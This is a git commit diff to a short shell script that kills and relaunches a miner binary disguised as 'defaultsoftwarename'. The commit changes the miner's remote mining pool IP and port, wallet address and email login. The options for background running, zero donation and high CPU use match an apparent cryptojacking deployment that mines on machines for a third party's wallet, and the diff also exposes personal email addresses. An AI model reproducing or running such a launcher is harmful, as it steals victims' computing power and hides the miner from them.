7417a613f0d517255552d4aff090d3eecb9346e0
zadson <52073361+zadson@users.noreply.github.com>
2019-09-25 11:34:33 +0800

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 179.43.157.31:38174 -u 45By7dFPBb1NShKW9LL8A76pWHb6QNmGZVjDXeT4Qr3tDs191iC7W7QbPC3P15iBozQh1AXVHMd7QHEXudpyNrkf6BhQG2J --pass=x:samantha_patton@yahoo.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
+defaultsoftwarename -o 37.1.215.13:41297 -u 45RXCkJUNXyhzU9sf239zvArQ68v26xbnSr23RxHWddd7huRpEy936RZUc2iEsk5YtXG4K3NcwV8ehrQaJqcCfm3UgQv3zq --pass=x:tonymathews932@yahoo.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
